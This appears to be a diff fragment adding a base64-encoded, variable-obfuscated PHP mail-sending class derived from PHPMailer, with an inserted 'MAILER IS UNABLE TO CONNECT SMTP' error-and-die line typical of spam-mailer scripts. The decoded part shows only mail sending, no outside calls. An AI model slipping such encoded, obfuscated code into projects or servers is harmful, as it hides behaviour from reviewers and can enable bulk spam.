+Ym9keSBjYW4gYmUgcmVhZCBieSBtYWlsCgkgICAqIGNsaWVudHMgdGhhdCBkbyBub3QgaGF2ZSBI
+VE1MIGVtYWlsIGNhcGFiaWxpdHkgc3VjaCBhcyBtdXR0LiBDbGllbnRzCgkgICAqIHRoYXQgY2Fu
+IHJlYWQgSFRNTCB3aWxsIHZpZXcgdGhlIG5vcm1hbCBCb2R5LgoJICAgKiBAdmFyIHN0cmluZwoJ
+ICAgKi8KCSAgdmFyICR4NjMgICAgICAgICAgID0gJyc7CgoJICAvKioKCSAgICogU2V0cyB3b3Jk
+IHdyYXBwaW5nIG9uIHRoZSBib2R5IG9mIHRoZSBtZXNzYWdlIHRvIGEgZ2l2ZW4gbnVtYmVyIG9m
+CgkgICAqIGNoYXJhY3RlcnMuCgkgICAqIEB2YXIgaW50CgkgICAqLwoJICB2YXIgJHg2NCAgICAg
+ICAgICA9IDA7CgoJICAvKioKCSAgICogTWV0aG9kIHRvIHNlbmQgbWFpbDogKCJtYWlsIiwgInNl
+bmRtYWlsIiwgb3IgInNtdHAiKS4KCSAgICogQHZhciBzdHJpbmcKCSAgICovCgkgIHZhciAkeDY1
+ICAgICAgICAgICAgPSAnbWFpbCc7CgoJICAvKioKCSAgICogU2V0cyB0aGUgcGF0aCBvZiB0aGUg
+c2VuZG1haWwgcHJvZ3JhbS4KCSAgICogQHZhciBzdHJpbmcKCSAgICovCgkgIHZhciAkeDY2ICAg
+ICAgICAgID0gJy91c3Ivc2Jpbi9zZW5kbWFpbCc7CgoJICAvKioKCSAgICogUGF0aCB0byBQSFBN
+YWlsZXIgcGx1Z2lucy4gIFRoaXMgaXMgbm93IG9ubHkgdXNlZnVsIGlmIHRoZSBTTVRQIGNsYXNz
+CgkgICAqIGlzIGluIGEgZGlmZmVyZW50IGRpcmVjdG9yeSB0aGFuIHRoZSBQSFAgaW5jbHVkZSBw
+YXRoLgoJICAgKiBAdmFyIHN0cmluZwoJICAgKi8KCSAgdmFyICR4NjcgICAgICAgICA9ICcnOwoK
+CSAgLyoqCgkgICAqIEhvbGRzIFBIUE1haWxlciB2ZXJzaW9uLgoJICAgKiBAdmFyIHN0cmluZwoJ
+ICAgKi8KCSAgdmFyICR4NjggICAgICAgICAgID0gIiI7CgoJICAvKioKCSAgICogU2V0cyB0aGUg
+ZW1haWwgYWRkcmVzcyB0aGF0IGEgcmVhZGluZyBjb25maXJtYXRpb24gd2lsbCBiZSBzZW50LgoJ
+ICAgKiBAdmFyIHN0cmluZwoJICAgKi8KCSAgdmFyICR4NjkgID0gJyc7CgoJICAvKioKCSAgICog
+U2V0cyB0aGUgaG9zdG5hbWUgdG8gdXNlIGluIE1lc3NhZ2UtSWQgYW5kIFJlY2VpdmVkIGhlYWRl
+cnMKCSAgICogYW5kIGFzIGRlZmF1bHQgSEVMTyBzdHJpbmcuIElmIGVtcHR5LCB0aGUgdmFsdWUg
+cmV0dXJuZWQKCSAgICogYnkgU0VSVkVSX05BTUUgaXMgdXNlZCBvciAnbG9jYWxob3N0LmxvY2Fs
+ZG9tYWluJy4KCSAgICogQHZhciBzdHJpbmcKCSAgICovCgkgIHZhciAkeDZhICAgICAgICAgID0g
+Jyc7CgoJICAvKioKCSAgICogU2V0cyB0aGUgbWVzc2FnZSBJRCB0byBiZSB1c2VkIGluIHRoZSBN
+ZXNzYWdlLUlkIGhlYWRlci4KCSAgICogSWYgZW1wdHksIGEgdW5pcXVlIGlkIHdpbGwgYmUgZ2Vu
+ZXJhdGVkLgoJICAgKiBAdmFyIHN0cmluZwoJICAgKi8KCSAgdmFyICR4NmIgICAgICAgICA9ICcn
+OwoKCSAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoJ
+ICAvLyBQUk9QRVJUSUVTIEZPUiBTTVRQCgkgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8KCgkgIC8qKgoJICAgKiBTZXRzIHRoZSBTTVRQIGhvc3RzLiAg
+QWxsIGhvc3RzIG11c3QgYmUgc2VwYXJhdGVkIGJ5IGEKCSAgICogc2VtaWNvbG9uLiAgWW91IGNh
+biBhbHNvIHNwZWNpZnkgYSBkaWZmZXJlbnQgcG9ydAoJICAgKiBmb3IgZWFjaCBob3N0IGJ5IHVz
+aW5nIHRoaXMgZm9ybWF0OiBbaG9zdG5hbWU6cG9ydF0KCSAgICogKGUuZy4gInNtdHAxLmV4YW1w
+bGUuY29tOjI1O3NtdHAyLmV4YW1wbGUuY29tIikuCgkgICAqIEhvc3RzIHdpbGwgYmUgdHJpZWQg
+aW4gb3JkZXIuCgkgICAqIEB2YXIgc3RyaW5nCgkgICAqLwoJICB2YXIgJHg2YyAgICAgICAgPSAn
+bG9jYWxob3N0JzsKCgkgIC8qKgoJICAgKiBTZXRzIHRoZSBkZWZhdWx0IFNNVFAgc2VydmVyIHBv
+cnQuCgkgICAqIEB2YXIgaW50CgkgICAqLwoJICB2YXIgJHg2ZCAgICAgICAgPSAyNTsKCgkgIC8q
+KgoJICAgKiBTZXRzIHRoZSBTTVRQIEhFTE8gb2YgdGhlIG1lc3NhZ2UgKERlZmF1bHQgaXMgJHg2
+YSkuCgkgICAqIEB2YXIgc3RyaW5nCgkgICAqLwoJICB2YXIgJHg2ZSAgICAgICAgPSAnJzsKCgkg
+IC8qKgoJICAgKiBTZXRzIGNvbm5lY3Rpb24gcHJlZml4LgoJICAgKiBPcHRpb25zIGFyZSAiIiwg
+InNzbCIgb3IgInRscyIKCSAgICogQHZhciBzdHJpbmcKCSAgICovCgkgIHZhciAkeDZmID0gIiI7
+CgoJICAvKioKCSAgICogU2V0cyBTTVRQIGF1dGhlbnRpY2F0aW9uLiBVdGlsaXplcyB0aGUgVXNl
+cm5hbWUgYW5kIFBhc3N3b3JkIHZhcmlhYmxlcy4KCSAgICogQHZhciBib29sCgkgICAqLwoJICB2
+YXIgJHg3MCAgICAgPSBmYWxzZTsKCgkgIC8qKgoJICAgKiBTZXRzIFNNVFAgdXNlcm5hbWUuCgkg
+ICAqIEB2YXIgc3RyaW5nCgkgICAqLwoJICB2YXIgJHg3MSAgICAgPSAnJzsKCgkgIC8qKgoJICAg
+KiBTZXRzIFNNVFAgcGFzc3dvcmQuCgkgICAqIEB2YXIgc3RyaW5nCgkgICAqLwoJICB2YXIgJHg3
+MiAgICAgPSAnJzsKCgkgIC8qKgoJICAgKiBTZXRzIHRoZSBTTVRQIHNlcnZlciB0aW1lb3V0IGlu
+IHNlY29uZHMuIFRoaXMgZnVuY3Rpb24gd2lsbCBub3QKCSAgICogd29yayB3aXRoIHRoZSB3aW4z
+MiB2ZXJzaW9uLgoJICAgKiBAdmFyIGludAoJICAgKi8KCSAgdmFyICR4NzMgICAgICA9IDEwOwoK
+CSAgLyoqCgkgICAqIFNldHMgU01UUCBjbGFzcyBkZWJ1Z2dpbmcgb24gb3Igb2ZmLgoJICAgKiBA
+dmFyIGJvb2wKCSAgICovCgkgIHZhciAkeDc0ICAgID0gZmFsc2U7CgoJICAvKioKCSAgICogUHJl
+dmVudHMgdGhlIFNNVFAgY29ubmVjdGlvbiBmcm9tIGJlaW5nIGNsb3NlZCBhZnRlciBlYWNoIG1h
+aWwKCSAgICogc2VuZGluZy4gIElmIHRoaXMgaXMgc2V0IHRvIHRydWUgdGhlbiB0byBjbG9zZSB0
+aGUgY29ubmVjdGlvbgoJICAgKiByZXF1aXJlcyBhbiBleHBsaWNpdCBjYWxsIHRvIFNtdHBDbG9z
+ZSgpLgoJICAgKiBAdmFyIGJvb2wKCSAgICovCgkgIHZhciAkeDc1ID0gZmFsc2U7CgoJICAvKioK
+CSAgICogUHJvdmlkZXMgdGhlIGFiaWxpdHkgdG8gaGF2ZSB0aGUgVE8gZmllbGQgcHJvY2VzcyBp
+bmRpdmlkdWFsCgkgICAqIGVtYWlscywgaW5zdGVhZCBvZiBzZW5kaW5nIHRvIGVudGlyZSBUTyBh
+ZGRyZXNzZXMKCSAgICogQHZhciBib29sCgkgICAqLwoJICB2YXIgJHg3NiA9IGZhbHNlOwoKCSAg
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoJICAvLyBQ
+Uk9QRVJUSUVTLCBQUklWQVRFCgkgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8KCgkgIHZhciAkeDc3ICAgICAgICAgICAgPSBOVUxMOwoJICB2YXIgJHg1
+NCAgICAgICAgICAgICAgPSBhcnJheSgpOwoJICB2YXIgJHg3OCAgICAgICAgICAgICAgPSBhcnJh
+eSgpOwoJICB2YXIgJHg3OSAgICAgICAgICAgICA9IGFycmF5KCk7CgkgIHZhciAkeDdhICAgICAg
+ICAgPSBhcnJheSgpOwoJICB2YXIgJHg3YiAgICAgID0gYXJyYXkoKTsKCSAgdmFyICR4N2MgICAg
+PSBhcnJheSgpOwoJICB2YXIgJHg3ZCAgICA9ICcnOwoJICB2YXIgJHg3ZSAgICAgICAgPSBhcnJh
+eSgpOwoJICB2YXIgJHg3ZiAgICAgICAgPSBhcnJheSgpOwoJICB2YXIgJHg4MCAgICAgPSAwOwoJ
+ICB2YXIgJHg4MSAgICAgICAgICAgICAgPSAiXG4iOwoJICB2YXIgJHg4MiAgID0gIiI7CgkgIHZh
+ciAkeDgzICAgPSAiIjsKCgkgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8KCSAgLy8gTUVUSE9EUywgVkFSSUFCTEVTCgkgIC8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCgkgIC8qKgoJICAgKiBTZXRzIG1lc3Nh
+Z2UgdHlwZSB0byBIVE1MLgoJICAgKiBAcGFyYW0gYm9vbCAkeDg0CgkgICAqIEByZXR1cm4gdm9p
+ZAoJICAgKi8KCSAgZnVuY3Rpb24gSXNIVE1MKCR4ODQpIHsKCQlpZigkeDg0ID09IHRydWUpIHsK
+CQkgICR0aGlzLT5Db250ZW50VHlwZSA9ICd0ZXh0L2h0bWwnOwoJCX0gZWxzZSB7CgkJICAkdGhp
+cy0+Q29udGVudFR5cGUgPSAndGV4dC9wbGFpbic7CgkJfQoJICB9CgoJICAvKioKCSAgICogU2V0
+cyBNYWlsZXIgdG8gc2VuZCBtZXNzYWdlIHVzaW5nIFNNVFAuCgkgICAqIEByZXR1cm4gdm9pZAoJ
+ICAgKi8KCSAgZnVuY3Rpb24gSXNTTVRQKCkgewoJCSR0aGlzLT5NYWlsZXIgPSAnc210cCc7Cgkg
+IH0KCgkgIC8qKgoJICAgKiBTZXRzIE1haWxlciB0byBzZW5kIG1lc3NhZ2UgdXNpbmcgUEhQIG1h
+aWwoKSBmdW5jdGlvbi4KCSAgICogQHJldHVybiB2b2lkCgkgICAqLwoJICBmdW5jdGlvbiBJc01h
+aWwoKSB7CgkJJHRoaXMtPk1haWxlciA9ICdtYWlsJzsKCSAgfQoKCSAgLyoqCgkgICAqIFNldHMg
+TWFpbGVyIHRvIHNlbmQgbWVzc2FnZSB1c2luZyB0aGUgJHg2NiBwcm9ncmFtLgoJICAgKiBAcmV0
+dXJuIHZvaWQKCSAgICovCgkgIGZ1bmN0aW9uIElzU2VuZG1haWwoKSB7CgkJJHRoaXMtPk1haWxl
+ciA9ICdzZW5kbWFpbCc7CgkgIH0KCgkgIC8qKgoJICAgKiBTZXRzIE1haWxlciB0byBzZW5kIG1l
+c3NhZ2UgdXNpbmcgdGhlIHFtYWlsIE1UQS4KCSAgICogQHJldHVybiB2b2lkCgkgICAqLwoJICBm
+dW5jdGlvbiBJc1FtYWlsKCkgewoJCSR0aGlzLT5TZW5kbWFpbCA9ICcvdmFyL3FtYWlsL2Jpbi9z
+ZW5kbWFpbCc7CgkJJHRoaXMtPk1haWxlciA9ICdzZW5kbWFpbCc7CgkgIH0KCgkgIC8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCSAgLy8gTUVUSE9EUywg
+UkVDSVBJRU5UUwoJICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vCgoJICAvKioKCSAgICogQWRkcyBhICJUbyIgYWRkcmVzcy4KCSAgICogQHBhcmFtIHN0
+cmluZyAkeDg1CgkgICAqIEBwYXJhbSBzdHJpbmcgJHg0OAoJICAgKiBAcmV0dXJuIHZvaWQKCSAg
+ICovCgkgIGZ1bmN0aW9uIEFkZEFkZHJlc3MoJHg4NSwgJHg0OCA9ICcnKSB7CgkJJHg4NiA9IGNv
+dW50KCR0aGlzLT50byk7CgkJJHRoaXMtPnRvWyR4ODZdWzBdID0gdHJpbSgkeDg1KTsKCQkkdGhp
+cy0+dG9bJHg4Nl1bMV0gPSAkeDQ4OwoJICB9CgoJICAvKioKCSAgICogQWRkcyBhICJDYyIgYWRk
+cmVzcy4gTm90ZTogdGhpcyBmdW5jdGlvbiB3b3JrcwoJICAgKiB3aXRoIHRoZSBTTVRQIG1haWxl
+ciBvbiB3aW4zMiwgbm90IHdpdGggdGhlICJtYWlsIgoJICAgKiBtYWlsZXIuCgkgICAqIEBwYXJh
+bSBzdHJpbmcgJHg4NQoJICAgKiBAcGFyYW0gc3RyaW5nICR4NDgKCSAgICogQHJldHVybiB2b2lk
+CgkgICAqLwoJICBmdW5jdGlvbiBBZGRDQygkeDg1LCAkeDQ4ID0gJycpIHsKCQkkeDg2ID0gY291
+bnQoJHRoaXMtPmNjKTsKCQkkdGhpcy0+Y2NbJHg4Nl1bMF0gPSB0cmltKCR4ODUpOwoJCSR0aGlz
+LT5jY1skeDg2XVsxXSA9ICR4NDg7CgkgIH0KCgkgIC8qKgoJICAgKiBBZGRzIGEgIkJjYyIgYWRk
+cmVzcy4gTm90ZTogdGhpcyBmdW5jdGlvbiB3b3JrcwoJICAgKiB3aXRoIHRoZSBTTVRQIG1haWxl
+ciBvbiB3aW4zMiwgbm90IHdpdGggdGhlICJtYWlsIgoJICAgKiBtYWlsZXIuCgkgICAqIEBwYXJh
+bSBzdHJpbmcgJHg4NQoJICAgKiBAcGFyYW0gc3RyaW5nICR4NDgKCSAgICogQHJldHVybiB2b2lk
+CgkgICAqLwoJICBmdW5jdGlvbiBBZGRCQ0MoJHg4NSwgJHg0OCA9ICcnKSB7CgkJJHg4NiA9IGNv
+dW50KCR0aGlzLT5iY2MpOwoJCSR0aGlzLT5iY2NbJHg4Nl1bMF0gPSB0cmltKCR4ODUpOwoJCSR0
+aGlzLT5iY2NbJHg4Nl1bMV0gPSAkeDQ4OwoJICB9CgoJICAvKioKCSAgICogQWRkcyBhICJSZXBs
+eS1UbyIgYWRkcmVzcy4KCSAgICogQHBhcmFtIHN0cmluZyAkeDg1CgkgICAqIEBwYXJhbSBzdHJp
+bmcgJHg0OAoJICAgKiBAcmV0dXJuIHZvaWQKCSAgICovCgkgIGZ1bmN0aW9uIEFkZFJlcGx5VG8o
+JHg4NSwgJHg0OCA9ICcnKSB7CgkJJHg4NiA9IGNvdW50KCR0aGlzLT5SZXBseVRvKTsKCQkkdGhp
+cy0+UmVwbHlUb1skeDg2XVswXSA9IHRyaW0oJHg4NSk7CgkJJHRoaXMtPlJlcGx5VG9bJHg4Nl1b
+MV0gPSAkeDQ4OwoJICB9CgoJICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vCgkgIC8vIE1FVEhPRFMsIE1BSUwgU0VORElORwoJICAvLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgoJICAvKioKCSAgICogQ3JlYXRl
+cyBtZXNzYWdlIGFuZCBhc3NpZ25zIE1haWxlci4gSWYgdGhlIG1lc3NhZ2UgaXMKCSAgICogbm90
+IHNlbnQgc3VjY2Vzc2Z1bGx5IHRoZW4gaXQgcmV0dXJucyBmYWxzZS4gIFVzZSB0aGUgRXJyb3JJ
+bmZvCgkgICAqIHZhcmlhYmxlIHRvIHZpZXcgZGVzY3JpcHRpb24gb2YgdGhlIGVycm9yLgoJICAg
+KiBAcmV0dXJuIGJvb2wKCSAgICovCgkgIGZ1bmN0aW9uIFNlbmQoKSB7CgkJJHg4NyA9ICcnOwoJ
+CSR4ODggPSAnJzsKCQkkeDg5ID0gdHJ1ZTsKCgkJaWYoKGNvdW50KCR0aGlzLT50bykgKyBjb3Vu
+dCgkdGhpcy0+Y2MpICsgY291bnQoJHRoaXMtPmJjYykpIDwgMSkgewoJCSAgJHRoaXMtPlNldEVy
+cm9yKCR0aGlzLT5MYW5nKCdwcm92aWRlX2FkZHJlc3MnKSk7CgkJICByZXR1cm4gZmFsc2U7CgkJ
+fQoKCQkvKiBTZXQgd2hldGhlciB0aGUgbWVzc2FnZSBpcyBtdWx0aXBhcnQvYWx0ZXJuYXRpdmUg
+Ki8KCQlpZighZW1wdHkoJHRoaXMtPkFsdEJvZHkpKSB7CgkJICAkdGhpcy0+Q29udGVudFR5cGUg
+PSAnbXVsdGlwYXJ0L2FsdGVybmF0aXZlJzsKCQl9CgoJCSR0aGlzLT5lcnJvcl9jb3VudCA9IDA7
+IC8vIHJlc2V0IGVycm9ycwoJCSR0aGlzLT5TZXRNZXNzYWdlVHlwZSgpOwoJCSR4ODcgLj0gJHRo
+aXMtPkNyZWF0ZUhlYWRlcigpOwoJCSR4ODggPSAkdGhpcy0+Q3JlYXRlQm9keSgpOwoKCQlpZigk
+eDg4ID09ICcnKSB7CgkJICByZXR1cm4gZmFsc2U7CgkJfQoKCQkvKiBDaG9vc2UgdGhlIG1haWxl
+ciAqLwoJCXN3aXRjaCgkdGhpcy0+TWFpbGVyKSB7CgkJICBjYXNlICdzZW5kbWFpbCc6CgkJCSR4
+ODkgPSAkdGhpcy0+U2VuZG1haWxTZW5kKCR4ODcsICR4ODgpOwoJCQlicmVhazsKCQkgIGNhc2Ug
+J3NtdHAnOgoJCQkkeDg5ID0gJHRoaXMtPlNtdHBTZW5kKCR4ODcsICR4ODgpOwoJCQlicmVhazsK
+CQkgIGNhc2UgJ21haWwnOgoJCQkkeDg5ID0gJHRoaXMtPk1haWxTZW5kKCR4ODcsICR4ODgpOwoJ
+CQlicmVhazsKCQkgIGRlZmF1bHQ6CgkJCSR4ODkgPSAkdGhpcy0+TWFpbFNlbmQoJHg4NywgJHg4
+OCk7CgkJCWJyZWFrOwoJCQkvLyR0aGlzLT5TZXRFcnJvcigkdGhpcy0+TWFpbGVyIC4gJHRoaXMt
+PkxhbmcoJ21haWxlcl9ub3Rfc3VwcG9ydGVkJykpOwoJCQkvLyR4ODkgPSBmYWxzZTsKCQkJLy9i
+cmVhazsKCQl9CgoJCXJldHVybiAkeDg5OwoJICB9CgoJICAvKioKCSAgICogU2VuZHMgbWFpbCB1
+c2luZyB0aGUgJHg2NiBwcm9ncmFtLgoJICAgKiBAYWNjZXNzIHByaXZhdGUKCSAgICogQHJldHVy
+biBib29sCgkgICAqLwoJICBmdW5jdGlvbiBTZW5kbWFpbFNlbmQoJHg4NywgJHg4OCkgewoJCWlm
+ICgkdGhpcy0+U2VuZGVyICE9ICcnKSB7CgkJICAkeDhhID0gc3ByaW50ZigiJXMgLW9pIC1mICVz
+IC10IiwgZXNjYXBlc2hlbGxjbWQoJHRoaXMtPlNlbmRtYWlsKSwgZXNjYXBlc2hlbGxhcmcoJHRo
+aXMtPlNlbmRlcikpOwoJCX0gZWxzZSB7CgkJICAkeDhhID0gc3ByaW50ZigiJXMgLW9pIC10Iiwg
+ZXNjYXBlc2hlbGxjbWQoJHRoaXMtPlNlbmRtYWlsKSk7CgkJfQoKCQlpZighQCR4OGIgPSBwb3Bl
+bigkeDhhLCAndycpKSB7CgkJICAkdGhpcy0+U2V0RXJyb3IoJHRoaXMtPkxhbmcoJ2V4ZWN1dGUn
+KSAuICR0aGlzLT5TZW5kbWFpbCk7CgkJICByZXR1cm4gZmFsc2U7CgkJfQoKCQlmcHV0cygkeDhi
+LCAkeDg3KTsKCQlmcHV0cygkeDhiLCAkeDg4KTsKCgkJJHg4OSA9IHBjbG9zZSgkeDhiKTsKCQlp
+ZiAodmVyc2lvbl9jb21wYXJlKHBocHZlcnNpb24oKSwgJzQuMi4zJykgPT0gLTEpIHsKCQkgICR4
+ODkgPSAkeDg5ID4+IDggJiAweEZGOwoJCX0KCQlpZigkeDg5ICE9IDApIHsKCQkgICR0aGlzLT5T
+ZXRFcnJvcigkdGhpcy0+TGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsKTsKCQkgIHJl
+dHVybiBmYWxzZTsKCQl9CgkJcmV0dXJuIHRydWU7CgkgIH0KCgkgIC8qKgoJICAgKiBTZW5kcyBt
+YWlsIHVzaW5nIHRoZSBQSFAgbWFpbCgpIGZ1bmN0aW9uLgoJICAgKiBAYWNjZXNzIHByaXZhdGUK
+CSAgICogQHJldHVybiBib29sCgkgICAqLwoJICBmdW5jdGlvbiBNYWlsU2VuZCgkeDg3LCAkeDg4
+KSB7CgoJCSR4NTQgPSAnJzsKCQlmb3IoJHg4YyA9IDA7ICR4OGMgPCBjb3VudCgkdGhpcy0+dG8p
+OyAkeDhjKyspIHsKCQkgIGlmKCR4OGMgIT0gMCkgeyAkeDU0IC49ICcsICc7IH0KCQkgICR4NTQg
+Lj0gJHRoaXMtPkFkZHJGb3JtYXQoJHRoaXMtPnRvWyR4OGNdKTsKCQl9CgoJCSR4OGQgPSBzcGxp
+dCgnLCcsICR4NTQpOwoKCQkkeDExID0gc3ByaW50ZigiLW9pIC1mICVzIiwgJHRoaXMtPlNlbmRl
+cik7CgkJaWYgKCR0aGlzLT5TZW5kZXIgIT0gJycgJiYgc3RybGVuKGluaV9nZXQoJ3NhZmVfbW9k
+ZScpKSA8IDEpIHsKCQkgICR4OGUgPSBpbmlfZ2V0KCdzZW5kbWFpbF9mcm9tJyk7CgkJICBpbmlf
+c2V0KCdzZW5kbWFpbF9mcm9tJywgJHRoaXMtPlNlbmRlcik7CgkJICBpZiAoJHRoaXMtPlNpbmds
+ZVRvID09PSB0cnVlICYmIGNvdW50KCR4OGQpID4gMSkgewoJCQlmb3JlYWNoICgkeDhkIGFzICR4
+MTMgPT4gJHg4ZikgewoJCQkgICR4OTAgPSBAbWFpbCgkeDhmLCAkdGhpcy0+RW5jb2RlSGVhZGVy
+KCR0aGlzLT5TZWN1cmVIZWFkZXIoJHRoaXMtPlN1YmplY3QpKSwgJHg4OCwgJHg4NywgJHgxMSk7
+CgkJCX0KCQkgIH0gZWxzZSB7CgkJCSR4OTAgPSBAbWFpbCgkeDU0LCAkdGhpcy0+RW5jb2RlSGVh
+ZGVyKCR0aGlzLT5TZWN1cmVIZWFkZXIoJHRoaXMtPlN1YmplY3QpKSwgJHg4OCwgJHg4NywgJHgx
+MSk7CgkJICB9CgkJfSBlbHNlIHsKCQkgIGlmICgkdGhpcy0+U2luZ2xlVG8gPT09IHRydWUgJiYg
+Y291bnQoJHg4ZCkgPiAxKSB7CgkJCWZvcmVhY2ggKCR4OGQgYXMgJHgxMyA9PiAkeDhmKSB7CgkJ
+CSAgJHg5MCA9IEBtYWlsKCR4OGYsICR0aGlzLT5FbmNvZGVIZWFkZXIoJHRoaXMtPlNlY3VyZUhl
+YWRlcigkdGhpcy0+U3ViamVjdCkpLCAkeDg4LCAkeDg3LCAkeDExKTsKCQkJfQoJCSAgfSBlbHNl
+IHsKCQkJJHg5MCA9IEBtYWlsKCR4NTQsICR0aGlzLT5FbmNvZGVIZWFkZXIoJHRoaXMtPlNlY3Vy
+ZUhlYWRlcigkdGhpcy0+U3ViamVjdCkpLCAkeDg4LCAkeDg3KTsKCQkgIH0KCQl9CgoJCWlmIChp
+c3NldCgkeDhlKSkgewoJCSAgaW5pX3NldCgnc2VuZG1haWxfZnJvbScsICR4OGUpOwoJCX0KCgkJ
+aWYoISR4OTApIHsKCQkgICR0aGlzLT5TZXRFcnJvcigkdGhpcy0+TGFuZygnaW5zdGFudGlhdGUn
+KSk7CgkJICByZXR1cm4gZmFsc2U7CgkJfQoKCQlyZXR1cm4gdHJ1ZTsKCSAgfQoKCSAgLyoqCgkg
+ICAqIFNlbmRzIG1haWwgdmlhIFNNVFAgdXNpbmcgUGhwU01UUCAoQXV0aG9yOgoJICAgKiBDaHJp
+cyBSeWFuKS4gIFJldHVybnMgYm9vbC4gIFJldHVybnMgZmFsc2UgaWYgdGhlcmUgaXMgYQoJICAg
+KiBiYWQgTUFJTCBGUk9NLCBSQ1BULCBvciBEQVRBIGlucHV0LgoJICAgKiBAYWNjZXNzIHByaXZh
+dGUKCSAgICogQHJldHVybiBib29sCgkgICAqLwoJICBmdW5jdGlvbiBTbXRwU2VuZCgkeDg3LCAk
+eDg4KSB7CgkJJHgzMiA9ICcnOwoJCSR4OTEgPSBhcnJheSgpOwoKCQlpZighJHRoaXMtPlNtdHBD
+b25uZWN0KCkpIHtlY2hvICJGQUlMRUQgISE8cCBhbGlnbj1cImNlbnRlclwiPjxmb250IGNvbG9y
+PVwiI0Q0MDAxQVwiIHN0eWxlPVwiZm9udC1zdHlsZToxNHB0XCI+IE1BSUxFUiBJUyBVTkFCTEUg
+VE8gQ09OTkVDVCBTTVRQICEhPC9mb250PjwvcD4iO2RpZSgpOwoJCSAgcmV0dXJuIGZhbHNlOwoJ
+CX0KCgkJJHg5MiA9ICgkdGhpcy0+U2VuZGVyID09ICcnKSA/ICR0aGlzLT5Gcm9tIDogJHRoaXMt
+PlNlbmRlcjsKCQlpZighJHRoaXMtPnNtdHAtPk1haWwoJHg5MikpIHsKCQkgICR4MzIgPSAkdGhp
+cy0+TGFuZygnZnJvbV9mYWlsZWQnKSAuICR4OTI7CgkJICAkdGhpcy0+U2V0RXJyb3IoJHgzMik7
+CgkJICAkdGhpcy0+c210cC0+UmVzZXQoKTsKCQkgIHJldHVybiBmYWxzZTsKCQl9CgoJCS8qIEF0
+dGVtcHQgdG8gc2VuZCBhdHRhY2ggYWxsIHJlY2lwaWVudHMgKi8KCQlmb3IoJHg4YyA9IDA7ICR4
+OGMgPCBjb3VudCgkdGhpcy0+dG8pOyAkeDhjKyspIHsKCQkgIGlmKCEkdGhpcy0+c210cC0+UmVj
+aXBpZW50KCR0aGlzLT50b1skeDhjXVswXSkpIHsKCQkJJHg5MVtdID0gJHRoaXMtPnRvWyR4OGNd
+WzBdOwoJCSAgfQoJCX0KCQlmb3IoJHg4YyA9IDA7ICR4OGMgPCBjb3VudCgkdGhpcy0+Y2MpOyAk
+eDhjKyspIHsKCQkgIGlmKCEkdGhpcy0+c210cC0+UmVjaXBpZW50KCR0aGlzLT5jY1skeDhjXVsw
+XSkpIHsKCQkJJHg5MVtdID0gJHRoaXMtPmNjWyR4OGNdWzBdOwoJCSAgfQoJCX0KCQlmb3IoJHg4
+YyA9IDA7ICR4OGMgPCBjb3VudCgkdGhpcy0+YmNjKTsgJHg4YysrKSB7CgkJICBpZighJHRoaXMt
+PnNtdHAtPlJlY2lwaWVudCgkdGhpcy0+YmNjWyR4OGNdWzBdKSkgewoJCQkkeDkxW10gPSAkdGhp
+cy0+YmNjWyR4OGNdWzBdOwoJCSAgfQoJCX0KCgkJaWYoY291bnQoJHg5MSkgPiAwKSB7IC8vIENy
+ZWF0ZSBlcnJvciBtZXNzYWdlCgkJICBmb3IoJHg4YyA9IDA7ICR4OGMgPCBjb3VudCgkeDkxKTsg
+JHg4YysrKSB7CgkJCWlmKCR4OGMgIT0gMCkgewoJCQkgICR4MzIgLj0gJywgJzsKCQkJfQoJCQkk
+eDMyIC49ICR4OTFbJHg4Y107CgoJCSAgfQoJCSAgJHgzMiA9ICR0aGlzLT5MYW5nKCdyZWNpcGll
+bnRzX2ZhaWxlZCcpIC4gJHgzMjsKCQkgICR0aGlzLT5TZXRFcnJvcigkeDMyKTsKCQkgICR0aGlz
+LT5zbXRwLT5SZXNldCgpOwoJCSAgcmV0dXJuIGZhbHNlOwoJCX0KCgkJaWYoISR0aGlzLT5zbXRw
+LT5EYXRhKCR4ODcgLiAkeDg4KSkgewoJCSAgJHRoaXMtPlNldEVycm9yKCR0aGlzLT5MYW5nKCdk
+YXRhX25vdF9hY2NlcHRlZCcpKTsKCQkgICR0aGlzLT5zbXRwLT5SZXNldCgpOwoJCSAgcmV0dXJu
+IGZhbHNlOwoJCX0KCQlpZigkdGhpcy0+U01UUEtlZXBBbGl2ZSA9PSB0cnVlKSB7CgkJICAkdGhp
+cy0+c210cC0+UmVzZXQoKTsKCQl9IGVsc2UgewoJCSAgJHRoaXMtPlNtdHBDbG9zZSgpOwoJCX0K
+CgkJcmV0dXJuIHRydWU7CgkgIH0KCgkgIC8qKgoJICAgKiBJbml0aWF0ZXMgYSBjb25uZWN0aW9u
+IHRvIGFuIFNNVFAgc2VydmVyLiAgUmV0dXJucyBmYWxzZSBpZiB0aGUKCSAgICogb3BlcmF0aW9u
+IGZhaWxlZC4KCSAgICogQGFjY2VzcyBwcml2YXRlCgkgICAqIEByZXR1cm4gYm9vbAoJICAgKi8K
+CSAgZnVuY3Rpb24gU210cENvbm5lY3QoKSB7CgkJaWYoJHRoaXMtPnNtdHAgPT0gTlVMTCkgewoJ
